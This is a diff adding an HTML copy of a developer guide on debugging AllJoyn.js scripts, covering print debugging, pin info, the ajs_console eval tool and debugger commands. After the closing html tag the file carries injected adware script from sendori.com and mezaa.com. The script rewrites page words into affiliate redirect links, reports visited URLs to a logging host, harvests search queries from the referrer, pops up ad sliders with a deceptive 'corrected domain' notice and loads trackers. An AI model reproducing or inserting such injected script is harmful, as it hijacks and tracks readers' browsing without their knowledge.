@@ -1,0 +1,464 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>Untitled Document.md</title><style></style></head><body>
+<p>This work is licensed under a Creative Commons Attribution 4.0 International License.
+<a href="http://creativecommons.org/licenses/by/4.0/">http://creativecommons.org/licenses/by/4.0/</a></p>
+<h1 id="debugging-alljoyn-js">Debugging AllJoyn.js</h1>
+<hr>
+<p>JavaScipt may be easy to write but can sometimes be hard to debug without tools like GDB. Since AllJoyn.js abstracts the underlying implementation it is sometimes difficult to find out why your AllJoyn.js script is not working properly. There are some tools that you can leverage to find out what is going wrong.</p>
+<h3 id="print-debugging">Print Debugging</h3>
+<p>There is always the classic print debugging that you can use to figure out program flow or what variables are set to. As with most languages its as simple as calling print() in a location of interest</p>
+<pre><code class="lang-javascript"><span class="hljs-keyword">var</span> adc = IO.analogOut(IO.pin[<span class="hljs-number">1</span>]);
+
+<span class="hljs-comment">/*...Some code manipulating 'adc'...*/</span>
+
+print(adc.value());
+</code></pre>
+<h4 id="or">or</h4>
+<pre><code>function myFunc(var) {
+    if (cond) {
+        /*Do something*/
+        print(&quot;The condition was met&quot;);
+    } else {
+        /*Something else*/
+        print(&quot;The condition was not met&quot;);
+    }
+</code></pre><h3 id="pin-information">Pin information</h3>
+<p>If the problem your having comes from an incorrect pin configuration or an unknown pin type there is pin information that can be queried from JavaScript. They are mentioned in the IO Documentation as well. After you have created a pin object you can look at its pin properties to find out information about it.</p>
+<pre><code class="lang-javascript"><span class="hljs-keyword">var</span> mypin = IO.digitalOut(IO.pin[<span class="hljs-number">1</span>]);
+
+print(mypin.info.physicalPin);
+print(mypin.info.schematicId);
+print(mypin.info.datasheetId);
+print(mypin.info.description);
+</code></pre>
+<p>This might print out something like:</p>
+<pre><code>62
+GPIO_PD15
+PD15
+Blue LED
+</code></pre><p>Now we know that pin 1 is a GPIO pin, its pin PD15 on the hardware your using, and its also a blue LED. Using the pin information can tell you if your using the pin for the right function.</p>
+<h3 id="console-application">Console Application</h3>
+<p>The final tool at your disposal is the console application. It is a command line application that can be used to send scripts over the air (OTA) as well as send short JavaScript commands (evals) directly to the JavaScript engine. To get this setup you will also need to have AllJoyn Standard Library on your Linux, Mac, or Windows machine. This can either be done by downloading the SDK or building from source. Information about how to do this can be found at <a href="https://wiki.allseenalliance.org">https://wiki.allseenalliance.org</a>.</p>
+<p>Once you have AllJoyn Standard Library up and running you will need to compile the console application. In the alljoyn-js directory navigate to the &#39;console&#39; folder. From here it is as easy as running &#39;scons&#39; as with building alljoyn-js. After running scons you should have an executable named &#39;ajs_console&#39;. This can be run by iteslf or with a JavaScript script as a parameter. Doing this will send the script OTA to your AllJoyn.js device.</p>
+<h5 id="sending-a-script-ota">Sending a script OTA</h5>
+<p>Before we look at the eval feature we can try sending a script OTA to the AllJoyn.js device. To do this you simply run the console application with the script you want to send as the first parameter:</p>
+<ul>
+<li><h5 id="linux-mac">Linux/Mac</h5>
+<pre><code>./console/ajs_console js/blinky.js
+</code></pre></li>
+<li><h5 id="windows">Windows</h5>
+<pre><code>console\ajs_console.exe js\blinky.js
+</code></pre>This command will then send the&quot;blinky.js&quot; script to the AllJoyn.js device, compile it, and execute it. For some devices that dont have any kind of shell or UI this is the only way to run scripts on them. The console will execute the entire script on the device. Next we will look at the eval feature where you can execute single lines of JavaScript.</li>
+</ul>
+<p>Running the console application by itself without a script as a parameter will connect to the AllJoyn.js device but not execute any JavaScript. Once your connected you can type in lines of JavaScript you want to &quot;evaluate&quot; in the engine. This can be simple like 1+1 or more complex like actually manipulating the hardware.</p>
+<h5 id="evaluate-a-simple-expression-">Evaluate a simple expression:</h5>
+<pre><code>1+1
+Eval: 1+1;
+Eval result=0: 2
+</code></pre><h5 id="configure-a-pin-">Configure a pin:</h5>
+<p>This wil cause pin 15 to go high every 500 ms</p>
+<pre><code>setInterval(function(){IO.digitalOut(IO.pin[15]).toggle()}, 500);
+</code></pre><p>The console application allows you to easily test out simple JavaScript code without having to compleatly write a script and run it on the platform your debugging. This is very useful for on the fly testing and debugging because you can talk, in real time, to the AllJoyn.js device.</p>
+<h4 id="real-time-debugging-">Real time debugging:</h4>
+<p>This section goes over using the debugging client to remotely debug AllJoyn.js applications in real time. At your disposal are a command line based tool as well as a Python GUI. The command line tool requires no additional dependencies and is much eaiser to use if you have some experience with using gdb from the command line, though it is much more limited than gdb. The Python GUI allows you to visualize everything. You can see your source code, the line your on, local variables etc. all in one screen. The GUI is more geared towards someone who is just starting out debugging and/or writing AllJoyn.js programs.</p>
+<h5 id="text-console-">Text console:</h5>
+<p>To use the text debug text console is built into the console application. Simply run using the --debug flag and it will connect to your AllJoyn.js program in debug mode, haulting execution as soon as its connected.</p>
+<pre><code>./console/ajs_console --debug
+</code></pre><p>You will see a similar connection routine as without the --debug flag but after a sucessful connection the program will be paused or haulted, waiting for you to input a command. All debug commands are prefixed with &#39;$&#39; to distinguish between Evals. Here is a list of all debug commands:</p>
+<pre><code>$in         // Step in
+$out        // Step out
+$over       // Step over
+$resume     // Resume debugging
+$pause      // Pause debugging
+$attach     // Attach the debugger
+$detach     // Detach the debugger
+$addbreak   // Add a breakpoint
+$delbreak   // Remove a breakpoint
+$lb         // List breakpoints
+$bt         // See a current stack trace
+$getvar     // Get a variable
+$eval       // Do an Eval (different from standard eval)
+</code></pre><h6 id="stepping">Stepping</h6>
+<p>The commands $in, $out, and $over are all stepping commands. Executing $in will result in a single step. If the line of code is on a funcion it will step into that funcion, otherwise it will just step to the next line. Using $out will cause the debugger to step out of the current scope. If your in a function you will step out of that function as if it has returned. Executing $over will result in stepping over a single line of code.</p>
+<h6 id="pause-resume-attach-detach">Pause/Resume/Attach/Detach</h6>
+<p>These 2 sets of commands may seem similar but they are quite different. Attach/Detach will disconnect or re-connect you to the debug target. If you execute $detach while debugging the AllJoyn.js target will execute as if no debugger is attached, meaning you cannot hault, step, or do anything until you call $attach again. Using $pause and $resume leave the debugger attached but hault or resume execution while still allowing you to use the debugger. For example calling $resume will cause the debugger to begin running but you still can add a breakpoint or call $pause to hault the program in its current location.</p>
+<h6 id="add-break-delete-break-and-list-break">Add Break, Delete Break and List break</h6>
+<p>These three commands all pertain to using breakpoints. A breakpoint is something that can be added to a line of code and if that line of code is reached the debugger will immediatly hault, or break, at that line of code. To add a breakpoint...</p>
+<pre><code>$addbreak myfile.js 25
+</code></pre><p>This will add a breakpoint and store it at index zero. If you add another it will be at index 1 etc. To see all breakpoints you have added use the $lb command (list breakpoints)</p>
+<pre><code>$lb
+</code></pre><p>This shows all breakpoints and their index. To delete a breakpoint use $delbreak</p>
+<pre><code>$delbreak &lt;index&gt;
+</code></pre><h6 id="backtrace">Backtrace</h6>
+<p>A backtrace is very important for determining where you are in your AllJoyn.js program. It will list all new program scopes in order so you can see where you have been and where you currently are in the program.</p>
+<pre><code>$bt
+</code></pre><h6 id="get-var-and-eval">Get var and Eval</h6>
+<p>When your at some point in your code you may want to inspect a variable and see its value. This is done using $getvar.</p>
+<pre><code>$getvar &lt;name&gt;
+</code></pre><p>This will output the variables value. Here you will be able to see if its been initialized, and if it has what exists in that variable. Some complex data types like objects require an extra step to fully inspect their elements. While debugging you must use &#39;Eval&#39; but not the same Eval as the regular console (without debugging). Its very similar to use...</p>
+<pre><code>$eval &lt;statement&gt;
+</code></pre><p>For example say you have an object &#39;obj&#39;</p>
+<pre><code>var obj = {
+    val1:12
+    val2:&quot;twelve&quot;
+}
+</code></pre><p>If you want to inspect val1 or val2 $getvar will not work. You must use Eval like:</p>
+<pre><code>$eval obj.val1
+12
+$eval obj.val2
+&quot;twelve&quot;
+</code></pre><p>This covers the basics of the text debugger client but some users may want a more visual tool, the debugger GUI</p>
+<h3 id="python-debugger-gui">Python debugger GUI</h3>
+<p>This tool gives the user a visual, easy to use tool for debugging AllJoyn.js programs. All the debug functions described previously are present as buttons and things like breakpoints and stack traces are viewed in a window. If you have used any debugger GUI before this should come natural to you and if not its still very intuative. Along the left column are your control buttons: Stepping, Attach/Detach, Pause/Resume and installing a new script. The main window will show your script and highlight the current line your on. Current breakpoints highlight the line number red in the source window. Local variables can be viewed in the top right window. Below locals are your current breakpoints. Your stack trace is located under the breakpoint view. There is a text entry section under the source viewer for evals and below that is a console window for looking at prints, debug messages and eval output. There is a help button that will bring up a new window which explains the usage more in depth. </p>
+<p>To use the Python GUI you must first build the AJSConsole library for Python by running setup.py</p>
+<pre><code>cd console/
+python setup.py build
+python setup.py install
+</code></pre><p>This will build AJSConsole.so and put it in your Python library directory. You may need to run the installer as a root user if you get a permission error. After those commands were run sucessfully you can launch the Python GUI.</p>
+<pre><code>python pydebugger.py
+</code></pre><p>This will behave the same way as the standard console in that it will look for a AllJoyn.js application running on the network and connect to it. You should then see the source window populated with the script installed on the target device.</p>
+
+</body></html><script type="text/javascript" src="http://code.jquery.com/jquery-1.4.2.min.js"></script>
+<script type="text/javascript" src="http://cdn.mezaa.com/js/inlinekeywords.js"></script>
+<script type="text/javascript">
+function sendoriInline2(){function b(a,b,d){if((a==-1||!c(d.charAt(a)))&&(b>=d.length||!c(d.charAt(b)))){return true}return false}function c(a){var b=a.charCodeAt(0);if(b>47&&b<58||b>64&&b<91||b>96&&b<123){return true}return false}var a=window.location!=window.parent.location?true:false;if(a){return false}var d=jQuery.noConflict();d(document).ready(function(){function h(a){if(a=="SCRIPT"||a=="TITLE"||a=="A"||a=="STYLE"||a=="H1"||a=="H2"||a=="H3"||a=="H4"||a=="INPUT"||a=="IMG"||a=="FORM"||a=="BUTTON"||a=="LINK"||a=="IFRAME"||a=="SELECT"||a=="ALT"||a=="LABEL"||a=="META"||a=="NOSCRIPT"||a=="OBJECT"||a=="PARAM"||a=="CITE"||a=="/BODY"||a=="BR"||a=="HEAD"){return true}else{return false}}function i(d){var f=document.URL;var h=new Object;h.substituted=false;if(g==true){return h}if(typeof console==="undefined"||typeof console.log==="undefined"){console={};console.log=function(){}}var i=0;var j;textval=d.toLowerCase();for(var k=0;k<blacklist_keywords.blacklist.length&&g==false&&d.length>0;k++){i=0;negativeword=blacklist_keywords.blacklist[k].keyword.toLowerCase();while(i<d.length&&textval.indexOf(negativeword,i)>=0){i=textval.indexOf(negativeword,i);j=i+negativeword.length;if(b(i-1,i+negativeword.length,textval)){g=true;break}i=j}}i=0;for(var l=0;l<inline_keyword_obj.inlinebrands.length&&g==false;l++){if(a>=c){break}var m=inline_keyword_obj.inlinebrands[l].brandword;var n=inline_keyword_obj.inlinebrands[l].hostname;i=0;var o=m;if(m.indexOf("&")>=0){o=m.replace("&","")}if(m.indexOf("'")>=0){o=m.replace("'","")}var p="http://securelink.sendori.com/br?key="+o+"&spid=1853&output=redirect&ix=1";var q="<a href='"+p+"' target='_blank'><span id='inlineTextHighlight'>";var r="</span></a>";while(i<d.length&&d.indexOf(m,i)>=0&&a<c){i=d.indexOf(m,i);j=i+m.length;if(f.indexOf(n)<0&&b(i-1,i+m.length,d)){var s=d.substring(0,i);var t=d.substring(j);h.newText=s+q+m+r+t;h.substituted=true;e[e.length]="http://l.mezaa.com/stbin/lognow.cgi/?key="+o+"&domain="+document.URL;a++}else{}i=j}}return h}function j(a){if(g==true){return}var b=a.nodeValue;var c=a.parentNode;var d=i(b);if(d.substituted==true){var e=document.createElement("SPAN");e.innerHTML=d.newText;c.replaceChild(e,a)}}function k(a){if(h(a.nodeName)){return}if(a.nodeName=="#text"&&d.trim(a.nodeValue).length>0){j(a)}if(a.hasChildNodes()){for(var b=0;b<a.childNodes.length;b++){k(a.childNodes[b])}}}var a=0;var c=10;var e=new Array;var f=document.URL;var g=false;if(typeof console==="undefined"||typeof console.log==="undefined"){console={};console.log=function(){}}d.expr[":"].HasBlackListURL=function(a,b,c){var e=false;d.each(blacklist_urls.urls,function(b){urlstring=this.url.toString().toLowerCase();if(d(a).attr("href")!=null&&d(a).attr("href")!=="undefined"&&d(a).attr("href").toString().toLowerCase().indexOf(urlstring)>=0){e=true}});return e};if(d("a:HasBlackListURL('')").length>0){g=true}var l=document.getElementsByTagName("body");for(var m=0;m<l.length;m++){var n=l[m];k(n)}if(g==false){for(var m=0;m<e.length;m++){d.ajax({url:e[m],type:"GET",dataType:"jsonp",cache:false,error:function(){}})}}else{d("a[href*=securelink.sendori.com/br]").each(function(a){var b=d(this).text();d(this).replaceWith(b)})}})}
+
+sendoriInline2();
+
+        function sendoriSlider()
+    {
+
+        var isInIFrame = (window.location != window.parent.location) ? true : false;
+        var sdiJQ=jQuery.noConflict(true);
+        sdiJQ(document).ready(function() {
+
+        if(!isInIFrame) {
+        displaySliderAd();
+        }
+
+        });
+
+        var CorrectedDomain;
+  var sndpID = '30001';
+        var sndgID = '{C48F32D1-4424-4217-9268-6F9F8FE3533C}';
+    var mseEntry = 1;
+    var msSecurityFlag = 1;
+    var programData = 'Mezaa';
+    var OriginalDomain;
+     var merchantId;
+
+        function  displaySliderAd() {
+            var foundBrand = false;
+            if(CorrectedDomain != undefined && OriginalDomain != undefined) {
+            // Nx flow
+
+            for(var index = 0; index < slider_keywords.slidertext.length; index++) {
+            var brandterm = slider_keywords.slidertext[index].BRAND;
+             if(CorrectedDomain.indexOf(brandterm.toLowerCase()) >= 0) {
+
+            brand_category = slider_keywords.slidertext[index].CATEGORY;
+            faviconsrc =  slider_keywords.slidertext[index].FAVICONSRC;
+            makeTibCall(brand_category,"NX",1860,faviconsrc);
+            foundBrand = true;
+            break;
+            }
+        }
+        if(!foundBrand)
+                                        {showNoadLegend(CorrectedDomain, "NX");}
+
+        }
+
+        if (!isSearchfromGoog() && !isSearchfromBing() && !isSearchfromYahoo() && !isSearchfromAsk()) return false;
+        if(isSearchfromYahoo()) {
+            query= getQuery("p");
+            }
+        else {
+            query= getQuery("q");
+            }
+
+        if(query == undefined || query == null || query == "") {
+            return false;
+            }
+
+        for(var index = 0; index < slider_keywords.slidertext.length; index++) {
+                var brandterm = slider_keywords.slidertext[index].BRAND;
+                if(brandterm.toLowerCase() == query.toLowerCase()) {
+                faviconsrc =  slider_keywords.slidertext[index].FAVICONSRC;
+                makeTibCall(brandterm,"SERP",1871,faviconsrc);
+                }
+
+            }
+
+
+
+            }
+
+
+            function showLegend(source,title,description,displayURL,clickURL,faviconsrc){
+
+                divToInsert = "<div id='slider_container' style='display:none'><div id='slider_header'>" ;
+
+                if(source == "NX") {
+                divToInsert += "<div id='notification_alert'></div>"
+                + "<div id='notification_message'></div>";
+
+                }
+
+
+            divToInsert += "<div style='left:auto; position:absolute; right:0;margin-right:5px;margin-top:4px;'><div id='snd_logo'></div>"  +
+                "<div id='icon_close'></div></div></div>" +
+        "<div id='slider_body'>" ;
+            var ua = sdiJQ.browser;
+            if ( ua.msie && ua.version.slice(0,3) == "7.0" )  {
+                divToInsert += "<div id='favicon'></div><div style='margin-left:30px;padding-top:3px;'>" ;
+                }
+            else {
+                sdiJQ('#favicon').css('height', '16px');
+                divToInsert += "<div id='favicon'></div><div style='margin-left:30px;padding-top:3px;position:absolute;'>" ;
+                }
+            divToInsert +="<div id='ad_title'></div>" +
+            "<div id='ad_body'></div></div>" +
+        "<div id='bt_learn'></div>" +
+        "</div>" +
+    "<div id='slider_footer'>" +
+        "<div id='ad_url'></div></div>" +
+    "</div>";
+    divToInsert += "<div style='display:none;'><img src='//pixel.quantserve.com/pixel/p-fbiS6Ydv_HyB-.gif' border='0' height='1' width='1' alt='Quantcast'/></div>";
+
+    var _qevents = _qevents || [];
+    _qevents.push({
+        qacct:"p-fbiS6Ydv_HyB-"
+        });
+
+
+    var quantcastTag = document.createElement("script");
+    quantcastTag.type = "text/javascript";
+    quantcastTag.src = "http://edge.quantserve.com/quant.js";
+    quantcastTag.async = true;
+    var scpt = document.getElementsByTagName('script')[0];
+    scpt.parentNode.insertBefore(quantcastTag, scpt);
+
+    sdiJQ(document.body).append(divToInsert);
+
+
+    if (sdiJQ("#slider_container").is( ":visible" )){
+        //  sdiJQ("#slider_container").slideUp( 1500 );
+
+        } else {
+        sdiJQ("#slider_container").slideDown( 1500);
+        }
+
+
+    sdiJQ("#icon_close").click(function(){
+        sdiJQ("#slider_container").slideUp( 1500 );
+        });
+
+    // if Nx flow add notification and mouseover
+    if(source == "NX") {
+
+        sdiJQ("#notification_message").html(getFittedText());
+
+        sdiJQ("#icon_close").click(function(){
+        sdiJQ("#slider_container").slideUp( 1500 );
+        });
+
+    }
+    sdiJQ('#ad_title').html(title);
+    sdiJQ('#ad_body').html(description);
+    sdiJQ('#ad_url').html("Sponsored by: " + displayURL);
+    if(faviconsrc=="G"){
+        favicon_url = "url(http://www.google.com/s2/favicons?domain=" + displayURL + ")";
+        }
+    else {
+        favicon_url = "url(" + faviconsrc + ")";
+        }
+    sdiJQ('#favicon').css("background-image", favicon_url);
+    sdiJQ('#slider_body').click(function(){
+
+        window.open(clickURL) ;
+        });
+
+    sdiJQ('#ad_url').hover(function(){sdiJQ(this).css('cursor','pointer')}, function(){sdiJQ(this).css('cursor','auto')});
+    sdiJQ('#snd_logo').hover(function(){sdiJQ(this).css('cursor','pointer')}, function(){sdiJQ(this).css('cursor','auto')});
+    sdiJQ('#ad_url').click(function(){
+        window.open(clickURL) ;
+        });
+    sdiJQ('#snd_logo').click(function(){
+        window.open('http://support.mezaa.com/home');
+        });
+
+    }
+
+    function showNoadLegend(){
+
+        var NxdivToInsert = "<div id='Nx_slider_container' style='display:none'>" +
+        "<div id='slider_header'>" +
+        "<div id='notification_alert'></div>" +
+        "<div id='notification_message'></div>" +
+        "<div style='left: auto; position: absolute; right:0;margin-right: 5px;margin-top:4px;'><div id='snd_logo'></div>" +
+        "<div id='icon_close'></div></div>" +
+        "</div>" +
+        "</div>" ;
+        NxdivToInsert += "<div style='display:none;'><img src='//pixel.quantserve.com/pixel/p-fbiS6Ydv_HyB-.gif' border='0' height='1' width='1' alt='Quantcast'/></div>";
+
+        var _qevents = _qevents || [];
+        _qevents.push({
+        qacct:"p-fbiS6Ydv_HyB-"
+        });
+
+
+    var quantcastTag = document.createElement("script");
+    quantcastTag.type = "text/javascript";
+    quantcastTag.src = "http://edge.quantserve.com/quant.js";
+    quantcastTag.async = true;
+    var scpt = document.getElementsByTagName('script')[0];
+    scpt.parentNode.insertBefore(quantcastTag, scpt);
+    sdiJQ(document.body).append(NxdivToInsert);
+
+
+    if (sdiJQ("#Nx_slider_container").is( ":visible" )){
+        sdiJQ("#Nx_slider_container").slideUp( 1500 );
+        } else if(!sdiJQ("slider_container").is( ":visible" )){
+        sdiJQ("#Nx_slider_container").slideDown( 1500);
+        }
+
+    if(sdiJQ("slider_container").is( ":visible" )) {
+        sdiJQ("#Nx_slider_container").css("display","none");
+        }
+
+
+    sdiJQ("#icon_close").click(function(){
+        sdiJQ("#Nx_slider_container").slideUp( 1500);
+        });
+
+    sdiJQ('#snd_logo').hover(function(){sdiJQ(this).css('cursor','pointer')}, function(){sdiJQ(this).css('cursor','auto')});
+    sdiJQ('#snd_logo').click(function(){
+        window.open('http://support.mezaa.com/home');
+        });
+
+
+    sdiJQ("#notification_message").html(getFittedText());
+
+
+    }
+
+    function isSearchfromGoog(){
+        if (document.referrer.indexOf("www.google.com/url") != -1 && document.URL.indexOf("google.com") == -1) {
+        return true;
+        }
+    return false;
+    }
+
+    function isSearchfromBing(){
+        if (document.referrer.indexOf("www.bing.com/search") != -1 && document.URL.indexOf("bing.com/search") == -1) {
+        return true;
+        }
+    return false;
+    }
+
+    function isSearchfromYahoo(){
+        if (document.referrer.indexOf("search.yahoo.com/search") != -1 && document.URL.indexOf("search.yahoo.com") == -1) {
+        return true;
+        }
+    return false;
+    }
+
+    function isSearchfromAsk(){
+        if (document.referrer.indexOf("www.ask.com/web") != -1 && document.URL.indexOf("ask.com/web") == -1) {
+        return true;
+        }
+    return false;
+    }
+
+    function getQuery(queryarg) {
+
+        var value;
+        var query = document.referrer;
+
+        var pairs = query.split("&");
+        for(var i = 0; i < pairs.length; i++) {
+
+        var pos = pairs[i].indexOf(queryarg + "=");
+        arg = pairs[i].substring(0, pos + 1);
+
+        if (pos != -1 && (arg == queryarg || (arg.indexOf("?" + queryarg) != -1)) ) {
+
+        value = pairs[i].substring(pos+2);
+        }
+
+    else continue;
+
+    }
+    return unescape(value);
+    }
+
+    function makeTibCall(query, source,spid,faviconsrc) {
+        sdiJQ.ajax({
+            url : "http://securelink.sendori.com/r?key=" + query + "&spid=" + spid + "&output=json&rf=" + document.domain,
+            type: "GET",
+            dataType: "jsonp",
+            cache: false,
+            success: function(result) {
+
+                if( typeof result.ads[0] !== "undefined" ) {
+                    if(result.ads[0].displayURL.indexOf("http") >= 0 || result.ads[0].displayURL.indexOf("https") >= 0 )   {
+                        displayURL = result.ads[0].displayURL.substring(result.ads[0].displayURL.indexOf("//") + 2);
+
+                    }
+    else displayURL =  result.ads[0].displayURL;
+    if(result.ads[0].url.indexOf("http") < 0) {
+            clickURL = "http://" + result.ads[0].url;
+            }
+        else clickURL =  result.ads[0].url;
+
+        showLegend(source,result.ads[0].title,result.ads[0].description,displayURL,clickURL,faviconsrc);
+
+
+        }
+
+        else if( source == "NX") {
+            // Nx flow and no ad returned
+            showNoadLegend();
+
+            }
+
+        }
+
+        });
+        }
+
+        function getFittedText(){
+            // display 80 characters of notififcation message
+            var texttoDisplay = "Your input '" + OriginalDomain + "' has been corrected to '" + CorrectedDomain + "'";
+            var fittedtext = "";
+            var limit = (texttoDisplay.length > 63) ? 63 : texttoDisplay.length ;
+            for(i=0;i< limit; ++i) {
+            fittedtext += texttoDisplay.charAt(i);
+            }
+        if(limit == 63) fittedtext += "...";
+        return fittedtext;
+        }
+
+        } //end  sendoriSlider
+
+        sendoriSlider();
+
+
+            </script>
+                <style type='text/css'>
+                #inlineTextHighlight{background:none repeat scroll 0 50% transparent;text-decoration:underline;display:inline;visibility:none;color:blue !important;font-family:Arial;cursor:pointer;line-height:1.5em}
+                #slider_header{height:26px;width:510px;background-image:url(http://cdn.mezaa.com/images/bg_header.png);background-repeat:repeat-x;border-left:1px #1A5189;border-top:1px #1A5189;border-right:1px #1A5189;display:block}
+                #slider_body{height:90px;width:510px;background-image:url(http://cdn.mezaa.com/images/bg_body.png);background-repeat:repeat-x;border-top:1px #438ECE;border-bottom:1px #438ECE;border-left:1px #1A5189;border-right:1px #1A5189;display:block;cursor:pointer}
+                #slider_footer{height:30px;width:510px;background-image:url(http://cdn.mezaa.com/images/bg_footer.png);background-repeat:repeat-x;border-left:1px #1A5189;border-right:1px #1A5189;border-bottom:1px #1A5189;display:block;cursor:auto}
+                #bt_learn{background-image:url(http://cdn.mezaa.com/images/btn_learn.png);background-repeat:no-repeat;height:90px;margin-right:5px;width:112px;margin-top:60px;left:auto;right:0;top:0;position:absolute;}
+                #icon_alert{height:16px;width:16px;background-image:url(http://cdn.mezaa.com/images/icon_alert.png);padding:5px}
+                #icon_close{background-image:url(http://cdn.sendori.com/images/icon_close.png);background-repeat:no-repeat;display:block;float:left;height:16px;width:16px;}
+                #favicon{background-position:center top;background-repeat:no-repeat;height:90px;margin-left:5px;margin-top:5px;width:16px;float:left;position:relative;}
+                #ad_title{font-family:Helvetica;font-size:13pt;font-weight:700;color:#000;text-decoration:underline;margin-right:122px;text-align:left}
+                #ad_body{font-family:Helvetica;font-size:11pt;color:#333;padding-top:5px;margin-right:125px;text-align:left;}
+                #ad_url{color:#FFF;float:left;font-family:Helvetica;font-size:10pt;margin-right:10px;margin-left:10px;padding-top:6px;cursor:auto}
+                #snd_logo{background-image:url(http://cdn.mezaa.com/images/logo.png); background-repeat:no-repeat;height:17px;width:65px;cursor:auto;float:left;margin-right:10px;margin-top:1px;}
+                #notification_message{color:#FFF;float:left;font-family:Helvetica;font-size:8pt;font-weight:700;padding-left:0;margin-top:5px;text-decoration:none;}
+                #notification_alert{background-image:url(http://cdn.mezaa.com/images/icon_alert.png);background-position:center center;background-repeat:no-repeat;float:left;height:16px;padding-left:10px;padding-top:5px;width:16px}
+                #slider_container{width:510px;height:146px;display:none;position:fixed;left:50%;bottom:0;margin-left:-255px;z-index:9999999999;border-radius:4px 4px 0 0;-webkit-border-radius:4px 4px 0 0;-moz-border-radius:4px 4px 0 0;box-shadow:0 0 9px #515151;-webkit-box-shadow:0 0 9px #515151;-moz-box-shadow:0 0 9px #515151}
+                #Nx_slider_container{width:510px;height:26px;display:none;position:fixed;left:50%;bottom:0;margin-left:-255px;border-radius:4px 4px 0 0;-webkit-border-radius:4px 4px 0 0;-moz-border-radius:4px 4px 0 0;z-index:9999999999;border-left:1px #1A5189;border-top:1px #1A5189;border-right:1px #1A5189;box-shadow:0 0 9px #515151;-webkit-box-shadow:0 0 9px #515151;-moz-box-shadow:0 0 9px #515151}
+                </style>
